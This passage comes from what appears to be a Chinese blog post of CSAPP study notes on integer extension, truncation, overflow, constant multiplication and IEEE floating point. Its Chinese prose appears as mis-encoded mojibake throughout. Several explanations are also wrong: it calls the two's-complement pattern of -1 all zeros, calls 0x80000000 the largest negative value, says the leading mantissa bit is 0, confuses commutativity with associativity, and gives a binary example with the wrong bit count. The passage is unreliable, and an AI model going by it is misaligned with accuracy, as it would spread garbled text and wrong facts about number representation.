c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&lt;(<span class="keyword">unsigned</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°å®ƒç»“æœä¸º0.</p><p>å› ä¸º <code>-1</code> çš„è¡¥ç å…¨ä¸º <code>0</code>ï¼Œè½¬ä¸ºæ— ç¬¦å·ä¹‹åä¼šå˜æˆæ— ç¬¦å·æ•´æ•°çš„æœ€å¤§å€¼ã€‚</p><h4 id="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º"><a href="#æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º" class="headerlink" title="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º"></a>æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º</h4><p>å°†ä¸€ä¸ªä½æ•°è¾ƒå°çš„æ•´æ•°æ‰©å±•ä¸ºä½æ•°è¾ƒå¤§çš„æ•´æ•°éå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å¼€å¤´æ·»åŠ  <code>0</code> å³å¯ï¼Œä½†æ˜¯å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™éœ€è¦å¼€å¤´æ·» <code>1</code>ï¼Œæˆ‘ä»¬è¿è¡Œä»¥ä¸‹ä»£ç è¯•è¯•çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">short</span> x=<span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">short</span> y=<span class="number">-0x1234</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line"><span class="keyword">int</span> x1=x;</span><br><span class="line"><span class="keyword">int</span> y1=y;</span><br><span class="line">show_bytes(&amp;x1,<span class="keyword">sizeof</span>(x1));</span><br><span class="line">show_bytes(&amp;y1,<span class="keyword">sizeof</span>(y1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¯ä»¥çœ‹åˆ°ç»“æœå¦‚æˆ‘ä»¬æ‰€è¯´ã€‚</p><p><img src="/2022/06/03/CSAPP_Datalab/4.png" alt="4"></p><h4 id="æˆªæ–­æ•°å­—"><a href="#æˆªæ–­æ•°å­—" class="headerlink" title="æˆªæ–­æ•°å­—"></a>æˆªæ–­æ•°å­—</h4><p>æœ‰æ‰©å±•ï¼Œè‡ªç„¶æœ‰æˆªæ–­ï¼Œå½“è¿ç®—çš„ç»“æœå¯èƒ½è¶…å‡ºç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§èŒƒå›´çš„æ—¶å€™ï¼Œå°±ä¼šå‘ç”Ÿæº¢å‡ºã€‚</p><p>åœ¨æ— ç¬¦å·æ•°æˆ–è€…æ­£æ•°å½“ä¸­ï¼Œæˆªæ–­ä¸º <code>w</code> ä½çš„æ•´æ•°å°±ç›¸å½“äºå–æ¨¡ <code>2^w</code> ï¼Œä½†æ˜¯æˆªæ–­æœ‰è´Ÿæ•´æ•°çš„æ—¶å€™å°±ä¼šå‘ç”Ÿæ„æƒ³ä¸åˆ°çš„äº‹æƒ…ã€‚æ¯”å¦‚è´Ÿæ•°æœ€å°å€¼å†å‡ä¸€é‚£ä¹ˆåšçš„è¿ç®—å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 0x80000000</span><br><span class="line"> 0xFFFFFFFF</span><br><span class="line">0x17FFFFFFF</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å¤šäº†ä¸€ä½ï¼Œé«˜ä½è¢«æˆªæ–­ï¼Œæœ€ç»ˆç»“æœä¸º <code>0x7FFFFFFF</code> ï¼Œä¸¤ä¸ªè´Ÿæ•°ç›¸åŠ ç»“æœå¾—å‡ºäº†æ­£æ•°ï¼Œè¿™æ˜¾ç„¶è¶…å‡ºäº†æˆ‘ä»¬çš„è®¤çŸ¥èŒƒå›´ã€‚è¿™ä¸ªæˆ‘ä»¬å«å®ƒè´Ÿæº¢å‡ºã€‚å†çœ‹ä¸€ä¸ªä¾‹å­ï¼šæ­£æ•°çš„æœ€å¤§å€¼åŠ  <code>1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7FFFFFFF</span><br><span class="line">0x00000001</span><br><span class="line">0x80000000</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯è´Ÿæ•°çš„æœ€å¤§å€¼ï¼Œä¸¤ä¸ªæ­£æ•°ç›¸åŠ å¾—å‡ºäº†è´Ÿæ•°ï¼Œæ˜¾ç„¶ä¹Ÿä¸åˆç†ï¼Œè¿™ä¸ªæˆ‘ä»¬å«ä»–æ­£æº¢å‡ºï¼Œä½†æ˜¯æ­£æº¢å‡ºå¹¶æ²¡æœ‰å‘ç”Ÿæˆªæ–­ï¼Œè€Œè´Ÿæº¢å‡ºæ˜¯ç”±æˆªæ–­å¼•èµ·çš„ã€‚</p><blockquote><p>è®¡ç®—æœºå†å²ä¸Šï¼Œæœ‰å¾ˆå¤šå®‰å…¨æ¼æ´éƒ½æ˜¯å› ä¸ºæœ‰ç¬¦å·å’Œæ— ç¬¦å·çš„æ­£æ•°å¼•èµ·çš„</p></blockquote><h4 id="æ— ç¬¦å·ä¹˜æ³•"><a href="#æ— ç¬¦å·ä¹˜æ³•" class="headerlink" title="æ— ç¬¦å·ä¹˜æ³•"></a>æ— ç¬¦å·ä¹˜æ³•</h4><p>å¯¹äºä¹˜æ³•æœ‰ <code>x*y=(x*y) mod 2^w</code> å…¶ä¸­ <code>w</code> ä¸º <code>x </code> å’Œ <code>y</code> çš„ä½æ•°ã€‚å› ä¸º <code>x</code> å’Œ <code>y</code> ç›¸ä¹˜å¯èƒ½å¾—åˆ°æœ€å¤§ <code>2w</code> ä½çš„æ•´æ•°ï¼Œå› æ­¤ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå¯¹äºæ— ç¬¦å·æ¥è¯´ï¼Œæˆªæ–­å°±ç›¸å½“äºå¯¹ <code>2^w</code> å–æ¨¡ ã€‚</p><h4 id="è¡¥ç ä¹˜æ³•"><a href="#è¡¥ç ä¹˜æ³•" class="headerlink" title="è¡¥ç ä¹˜æ³•"></a>è¡¥ç ä¹˜æ³•</h4><p>è¿™ä¸ªä¹˜æ³•å°±ç›¸å½“äºå…ˆåƒæ— ç¬¦å·ä¹˜æ³•ï¼Œä¹˜å‡ºæ¥æˆªæ–­ä¹‹åå†è½¬ä¸ºè¡¥ç å°±æ˜¯ç»“æœã€‚</p><h4 id="ä¹˜å¸¸æ•°"><a href="#ä¹˜å¸¸æ•°" class="headerlink" title="ä¹˜å¸¸æ•°"></a>ä¹˜å¸¸æ•°</h4><p>å› ä¸ºæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç‰¹æ€§ï¼šç§»ä½è¿ç®—ç›¸å½“äºå¯¹ <code>2^x</code> åšä¹˜é™¤æ³•ï¼Œå› æ­¤åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬èƒ½æŠŠä¹˜æ³•è½¬æˆç§»ä½è¿ç®—ï¼Œæ‰§è¡Œä¹˜æ³•æŒ‡ä»¤çš„æ—¶é—´æ¯”å…¶å®ƒæŒ‡ä»¤æ—¶é—´è¦é•¿çš„å¤šï¼Œå› æ­¤å¾ˆå¤šç¼–è¯‘å™¨åœ¨ç¼–è¯‘å¸¸æ•°ä¹˜æ³•çš„æ—¶å€™ä¼šæŠŠå¸¸æ•°äºŒè¿›åˆ¶æ‹†å¼€ç„¶ååˆ†åˆ«ç›¸ä¹˜ç›¸åŠ ã€‚</p><p>æ¯”å¦‚ä¹˜9ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>=<span class="number">0b1001</span></span><br><span class="line">x*<span class="number">9</span>=x*<span class="number">8</span>+x*<span class="number">1</span>=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p> ä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœ1çš„ä½æ•°å¾ˆå¤šé‚£å°±ç›¸å½“äºè¦åšå¾ˆå¤šæ¬¡ç§»ä½å’ŒåŠ æ³•ï¼Œæœ€åçš„å¤æ‚åº¦å¯èƒ½è·Ÿä¹˜æ³•æŒ‡ä»¤å·®ä¸å¤šï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦å¤–ä¸€ç§å§¿åŠ¿é¿å…è¿™ä¸ªé—®é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span>=<span class="number">0b1111</span>=<span class="number">0b10000</span><span class="number">-0b</span>1</span><br><span class="line">x*<span class="number">15</span>=x*<span class="number">16</span>-x*<span class="number">1</span>=(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡å€Ÿä¸€ä¸ªé«˜ä½ï¼Œå…¶ä½™ä½æƒå€¼å–åä¹‹åå†åŠ 1çš„æ–¹å¼é¿å…äº†è¿›è¡Œå¤§é‡çš„è¿ç®—ã€‚</p><h4 id="é™¤2çš„å¹‚"><a href="#é™¤2çš„å¹‚" class="headerlink" title="é™¤2çš„å¹‚"></a>é™¤2çš„å¹‚</h4><p>å¯¹äº2çš„å¹‚ï¼Œéå¸¸ç®€å•ï¼Œå³ç§»è¿ç®—å³å¯ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼šé™¤æ³•æ²¡æœ‰åˆ†é…å¾‹ï¼Œæ‰€ä»¥ä¹˜å¸¸æ•°çš„æ–¹å¼å¹¶ä¸é€‚ç”¨äºé™¤æ³•ã€‚é™¤æ³•ä¼šå‘é›¶å–æ•´ï¼Œæ¯”å¦‚ç®—å‡ºæ¥ç»“æœä¸º <code>3.5</code> åˆ™ä¼šå˜æˆ <code>3</code>ï¼Œç®—å‡ºæ¥ç»“æœ <code>-3.5</code> åˆ™ä¼šå˜æˆ <code>-3</code>ã€‚</p><h3 id="æµ®ç‚¹æ•°è¡¨ç¤º"><a href="#æµ®ç‚¹æ•°è¡¨ç¤º" class="headerlink" title="æµ®ç‚¹æ•°è¡¨ç¤º"></a>æµ®ç‚¹æ•°è¡¨ç¤º</h3><p>æ˜¾ç„¶æ•´æ•°å¹¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬å¹³æ—¶çš„éœ€è¦ï¼Œå¹³æ—¶è¿˜éœ€è¦è¿›è¡Œå¤§é‡çš„æµ®ç‚¹æ•°è¿ç®—ï¼Œè¾¾åˆ°å¤ªé˜³çš„è´¨é‡ï¼Œå°åˆ°ç”µå­çš„è´¨é‡ï¼Œéƒ½éœ€è¦èƒ½åœ¨è®¡ç®—æœºä¸­è¡¨ç¤ºã€‚è€Œè¿™ä¸ªèŒƒå›´è¦ç”¨æ•´æ•°çš„æ€è·¯è¡¨ç¤ºæ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æœ‰ç‰¹æ®Šçš„è¡¨ç¤ºæ–¹æ³•ã€‚</p><h4 id="äºŒè¿›åˆ¶å°æ•°"><a href="#äºŒè¿›åˆ¶å°æ•°" class="headerlink" title="äºŒè¿›åˆ¶å°æ•°"></a>äºŒè¿›åˆ¶å°æ•°</h4><p>æˆ‘ä»¬éƒ½çŸ¥é“åè¿›åˆ¶çš„å°æ•°ï¼Œå°æ•°ç‚¹å·¦è¾¹çš„æ•°å­—ä½çš„æƒå€¼ä» <code>10^0</code> å¼€å§‹ï¼ŒæŒ‡æ•°é€ä½é€’å¢ï¼Œè€Œå°æ•°ç‚¹å³è¾¹çš„æ•°å­—çš„ä½çš„æƒå€¼ä» <code>10^(-1)</code> å¼€å§‹ï¼Œé€ä½é€’å‡ã€‚</p><p>äºŒè¿›åˆ¶åŒç†ï¼Œåªä¸è¿‡æƒå€¼çš„åº•æ•°éƒ½å˜æˆäº† <code>2</code>ã€‚</p><h4 id="IEEEæµ®ç‚¹æ•°è¡¨ç¤º"><a href="#IEEEæµ®ç‚¹æ•°è¡¨ç¤º" class="headerlink" title="IEEEæµ®ç‚¹æ•°è¡¨ç¤º"></a>IEEEæµ®ç‚¹æ•°è¡¨ç¤º</h4><p>è¿™ä¸ªæ ‡å‡†è§„å®šçš„æµ®ç‚¹æ•°ç”¨å¦‚ä¸‹æ–¹å¼è¡¨ç¤ºï¼š</p><p><img src="/2022/06/03/CSAPP_Datalab/5.png" alt="5"></p><p>é‡Œé¢åŒ…å«äº†</p><ul><li>ç¬¦å·(s)ï¼š<code>1</code> è¡¨ç¤ºè´Ÿæ•°ï¼Œ<code>0</code> è¡¨ç¤ºæ­£æ•°</li><li>å°¾æ•°(M)ï¼šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„å°æ•°ï¼Œå–å€¼èŒƒå›´ä¸º <code>[1,2)</code></li><li>é˜¶ç (E)ï¼šä¸ºæµ®ç‚¹æ•°åŠ æƒã€‚</li></ul><p>å…¶å®è¿™ä¸ªå®šä¹‰å°±ç›¸å½“äºäºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³•ï¼Œæƒ³æƒ³åŸæ¥ç§‘å­¦è®¡æ•°æ³•çš„å®šä¹‰æ˜¯ä¸æ˜¯èƒ½æ›´æ¸…æ™°åœ°ç†è§£å®ƒäº†å‘¢ï¼Ÿ</p><p>è®²å®Œç†è®ºæ¥è®²ç‚¹å®é™…çš„ï¼š</p><p>æˆ‘ä»¬çŸ¥é“å®é™…ä¸Šæˆ‘ä»¬ç»å¸¸ç”¨çš„æµ®ç‚¹æ•°æœ‰ä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ <code>float</code> ä¸€ç±»æ˜¯ <code>double</code>ï¼Œ<code>float</code> ä¸º <code>32</code> ä½ï¼Œ<code>double</code> ä¸º <code>64</code> ä½ã€‚</p><ul><li>å¯¹äº <code>float</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼Œç¬¬ <code>2</code> åˆ°ç¬¬ <code>9</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç¬¬ <code>10</code> ä½åˆ°ç¬¬ <code>32</code> ä½å‡ä¸ºå°¾æ•°</li><li>å¯¹äº <code>double</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼Œç¬¬ <code>2</code> åˆ°ç¬¬ <code>12</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç¬¬ <code>13</code> ä½åˆ°ç¬¬ <code>64</code> ä½å‡ä¸ºå°¾æ•°</li></ul><p>æˆ‘ä»¬å…·ä½“ä»¥ <code>float</code> æ¥åˆ†æï¼š</p><p>ç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½æ²¡å•¥å¤§é—®é¢˜ã€‚åé¢çš„å…«ä½æ˜¯æŒ‡æ•°ï¼Œè¿™ä¸ªæŒ‡æ•°éœ€è¦èƒ½è¡¨ç¤ºæ— ç©·å¤§ï¼Œä¹Ÿè¦èƒ½è¡¨ç¤ºæ— ç©·å°ï¼Œå› æ­¤æŒ‡æ•°å¿…é¡»æœ‰æ­£æœ‰è´Ÿã€‚æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ•° <code>Bias=2^(k-1)-1</code> å…¶ä¸­ <code>k</code> ä¸ºé˜¶ç çš„ä½æ•°ï¼Œåœ¨ <code>float</code> ä¸­ï¼Œè¿™ä¸ªå€¼ä¸º <code>127</code>ï¼Œåœ¨ <code>double</code> ä¸­ï¼Œè¿™ä¸ªå€¼ä¸º <code>1023</code>ã€‚é˜¶ç å®é™…å€¼ <code>E=e-Bias</code>ï¼Œå…¶ä¸­ <code>e</code> è¡¨ç¤ºé˜¶ç æœ¬èº«çš„æ— ç¬¦å·äºŒè¿›åˆ¶çš„æ•°å€¼ã€‚ç„¶åå°±æ˜¯è¿™ä¸ªå°¾æ•°äº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„èŒƒå›´æ˜¯ <code>[1,2)</code>ï¼Œåœ¨è¿™ä¸ªèŒƒå›´å†…çš„å°é¼ ï¼Œä¸éš¾å‘ç°å°æ•°ç‚¹å‰æœ‰ä¸€ä½ä¸€ç›´æ˜¯ <code>0</code>ï¼Œå› æ­¤è¿™ä¸ª <code>0</code> æˆ‘ä»¬å°±ä¸å¿…å¤šèŠ±ä¸€ä½å­˜å‚¨å®ƒäº†ï¼Œå› æ­¤æˆ‘ä»¬çš„å°¾æ•°éƒ½æ˜¯å°æ•°ç‚¹åçš„å€¼ã€‚</p><p>å¦‚æœä¸€ä¸ª <code>32</code> ä½æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin:<span class="number">0b01000000010000000000000000000</span></span><br><span class="line">hex:<span class="number">0x40400000</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯ä»¥å‘ç°å®ƒæ˜¯æ­£æ•°ï¼Œé˜¶ç ä¸º <code>128</code>ï¼Œå°¾æ•°ä¸º <code>100000â€¦â€¦</code>ï¼Œå› ä¸ºå°æ•°ç‚¹åé¢çš„0éƒ½èƒ½å¿½ç•¥ï¼Œå› æ­¤å°¾æ•°å®é™…å°±æ˜¯ <code>1</code>ã€‚ç„¶åæ³¨æ„è¿™ä¸ªé˜¶ç å¹¶ä¸æ˜¯çœŸæ­£çš„å®é™…å€¼ï¼Œè¿™åªæ˜¯å®ƒè¡¨é¢ä¸Šçœ‹ä¸Šå»çš„å€¼ï¼Œå†ç»™å®ƒå‡å»ä¸€ä¸ª <code>127</code> ä¹‹åå¯ä»¥å‘ç°æŒ‡æ•°ä¸º <code>1</code>ã€‚å°æ•°ä½æ•°å› ä¸ºæœ‰ä¸€ä¸ªéšå«çš„ <code>1</code>ï¼Œæ‰€ä»¥å®ƒçš„å®é™…å€¼ä¸º <code>1.1</code>ï¼Œåè¿›åˆ¶å€¼å°±æ˜¯ <code>1.5</code>ï¼Œæ‰€ä»¥æœ€åç»“æœå°±æ˜¯ <code>1.5*2^1=3</code>ã€‚</p><p>ç„¶åæˆ‘ä»¬å†è¿è¡Œç¨‹åºçœ‹çœ‹ <code>3</code> çš„å­—èŠ‚æ˜¾ç¤ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x=<span class="number">3.0</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åå¯ä»¥å‘ç°ä¸æˆ‘ä»¬ä¸Šé¢ä¹¦å†™çš„åå…­è¿›åˆ¶å€¼ä¸€è‡´ã€‚</p><p>æµ®ç‚¹æ•°è¿˜æœ‰ <code>3 </code>ä¸­è¡¨ç¤ºå€¼çš„æƒ…å†µã€‚</p><ol><li>è§„æ ¼åŒ–çš„å€¼ï¼šè¿™æ˜¯æœ€æ™®éçš„æƒ…å†µï¼Œé˜¶ç ä½ä¸ä¸ºå…¨ <code>0</code> ä¹Ÿä¸ä¸ºå…¨ <code>1</code>.</li><li>éè§„æ ¼åŒ–çš„å€¼ï¼šå½“é˜¶ç ä½å…¨ä¸º <code>0</code> çš„æ—¶å€™ï¼Œè¡¨ç¤ºéè§„æ ¼åŒ–çš„å€¼ï¼Œè¿™ä¸ªéè§„æ ¼åŒ–çš„æ„æ€å°±æ˜¯è·Ÿæˆ‘ä»¬ä¸Šé¢ä»‹ç»çš„è§„å¾‹ç¨ç¨æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ­¤æ—¶å°¾æ•°æ˜¯ä¸å¸¦éšå«çš„ <code>1</code> çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒçš„æœ‰æ•ˆæ•°å­—ç›´æ¥æ˜¯ä»å°¾æ•°å¼€å§‹çš„ï¼Œå› æ­¤å®ƒå’Œé˜¶ç ä½æ¨¡å¼ä¸º<code>00000001</code> çš„æŒ‡æ•°ä¸€æ ·ï¼Œä½†æ˜¯æœ‰æ•ˆæ•°å­—å¤šä¸€ä¸ªå°æ•°ç‚¹å‰çš„ <code>1</code>ï¼Œå› ä¸ºè¿™æ ·è¡¨ç¤ºèƒ½å¤Ÿä½¿å¾—éè§„æ ¼åŒ–æ•°å€¼å‘è§„æ ¼åŒ–æ•°å€¼è½¬åŒ–æ›´ä¸ºå¹³æ»‘ã€‚</li><li>ç‰¹æ®Šå€¼ï¼šåŒ…æ‹¬ <code>INF</code> å’Œ <code>NAN</code>ï¼Œé˜¶ç ä½å…¨ä¸º <code>1</code> çš„æ—¶å€™ï¼Œè‹¥å°¾æ•°å…¨ä¸º0ï¼Œåˆ™å¾—åˆ° <code>INF</code>ï¼Œè‹¥ä¸å…¨ä¸º <code>0</code> åˆ™å¾—åˆ° <code>NAN</code>ã€‚</li></ol><h4 id="èˆå…¥"><a href="#èˆå…¥" class="headerlink" title="èˆå…¥"></a>èˆå…¥</h4><p>æµ®ç‚¹æ•°å› ä¸ºè¡¨è¾¾çš„ä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„æ•°ï¼Œåªæ˜¯ä¸€ä¸ªè¿‘ä¼¼å€¼ï¼Œå› æ­¤åœ¨ç²¾åº¦ä¸å¤Ÿçš„æƒ…å†µï¼Œåªèƒ½é€‰æ‹©èˆæ‰ä¸€äº›ç²¾åº¦ä¿è¯èƒ½å¤Ÿå­˜å‚¨ã€‚å¦‚ä½•èˆå…¥ä¾¿æˆä¸ºäº†ä¸€é¡¹éš¾é¢˜ï¼Œç›®å‰ä¸€å…±æœ‰å››ç§èˆå…¥æ–¹å¼ï¼šä¸‹é¢æˆ‘ä»¬ç»™å‡ºä¸€äº›ä¾‹å­</p><table><thead><tr><th>æ–¹å¼</th><th>1.40</th><th>1.60</th><th>1.50</th><th>2.50</th><th>-1.50</th></tr></thead><tbody><tr><td>å‘å¶æ•°èˆå…¥</td><td>1</td><td>2</td><td>2</td><td>2</td><td>-2</td></tr><tr><td>å‘é›¶èˆå…¥</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-1</td></tr><tr><td>å‘ä¸‹èˆå…¥</td><td>1</td><td>1</td><td>1</td><td>2</td><td>-2</td></tr><tr><td>å‘ä¸Šèˆå…¥</td><td>2</td><td>2</td><td>2</td><td>3</td><td>-1</td></tr></tbody></table><p>åé¢ä¸‰ä¸ªæ–¹å¼è¿˜å¥½ï¼Œåº”è¯¥éƒ½èƒ½ç†è§£ï¼Œä¸»è¦æ˜¯è¿™ä¸ªå‘å¶æ•°èˆå…¥ï¼Œå®ƒé¦–å…ˆæ»¡è¶³ï¼šè¢«èˆå…¥çš„å€¼ä¸è¶…è¿‡æœ€å°å•ä½çš„ä¸€åŠåˆ™ä¸¢å¼ƒï¼Œè‹¥è¶…è¿‡ä¸€åŠåˆ™åŠ ä¸Šä¸€ä¸ªæœ€å°å•ä½ï¼Œè‹¥ç­‰äºä¸€åŠåˆ™ä¸€å®šä¼šä½¿å¾—èˆå…¥çš„ç»“æœä¸ºå¶æ•°ä¸ªæœ€å°è®¡é‡å•ä½ã€‚</p><h4 id="æµ®ç‚¹è¿ç®—"><a href="#æµ®ç‚¹è¿ç®—" class="headerlink" title="æµ®ç‚¹è¿ç®—"></a>æµ®ç‚¹è¿ç®—</h4><p>åœ¨è¿›è¡Œæµ®ç‚¹æ•°åŠ å‡æ³•çš„æ—¶å€™ï¼Œé¦–å…ˆéœ€è¦å¯¹é˜¶ï¼Œå°é˜¶å‘å¤§é˜¶å¯¹é½ï¼Œç„¶åå°¾æ•°ç›¸åŠ ã€‚ç”±äºç‰¹æ®Šå€¼çš„å­˜åœ¨ï¼Œæµ®ç‚¹æ•°åŠ å‡æ³•å¹¶ä¸æ»¡è¶³äº¤æ¢è§„åˆ™ï¼Œå› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªé˜¿è´å°”ç¾¤ï¼Œå¾ˆå¤šæ•´æ•°è§„å¾‹ä¸é€‚ç”¨ã€‚</p><p>æ¯”å¦‚æœ€ç»å…¸çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1e111-1e111!=1e111-1e111+1</span><br></pre></td></tr></table></figure><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>è¿™é‡Œæ¥å›ç­”ä¸€ä¸‹ä¹‹å‰é—ç•™çš„ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸ºä»€ä¹ˆæ•´æ•°è½¬ä¸ºæµ®ç‚¹æ•°ä¹‹åä¼šæœ‰éƒ¨åˆ†ä½ç›¸åŒ¹é…ã€‚å…¶å®ä¸éš¾å‘ç°æ˜¯å› ä¸ºæµ®ç‚¹æ•°çš„å°¾æ•°åŸºæœ¬æ˜¯å’ŒåŸäºŒè¿›åˆ¶çš„å€¼ä¸€è‡´çš„ã€‚æ¯”å¦‚ä¸‹é¢çš„ä¸€ä¸ªæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1001001010101</span><br></pre></td></tr></table></figure><p>è½¬ä¸ºæµ®ç‚¹æ•°ä¹‹åå°±ä¼šå˜æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.001001010101*2^12</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°¾æ•°æ˜¯ä¸åŸäºŒè¿›åˆ¶çš„å€¼ä¸€è‡´çš„ï¼Œæƒ³åˆ°è¿™é‡Œä½ è‚¯å®šæ˜ç™½äº†ä¹‹å‰çš„é‚£ä¸ªé—®é¢˜äº†ã€‚</p><h2 id="CSAPP-datalab"><a href="#CSAPP-datalab" class="headerlink" title="CSAPP:datalab"></a>CSAPP:datalab</h2><p>ç»ˆäºåˆ°äº†æœ€æ¿€åŠ¨çš„å®éªŒç¯èŠ‚äº†ï¼ŒåŸå…ˆæˆ‘å¯¹è¿™æœ¬ä¹¦å¹¶æ²¡æœ‰å¾ˆæ·±çš„äº†è§£ï¼Œç›´æ¥ä¸Šæ‰‹åšçš„å®éªŒï¼Œä¸ä¼šå°±æœï¼Œç°åœ¨çœ‹å®Œä¸€éä¹‹åæ„Ÿè§‰ç†è§£å¾ˆå¤šï¼Œåšå®éªŒåŸºæœ¬ä¹Ÿæ˜¯ç•…é€šæ— 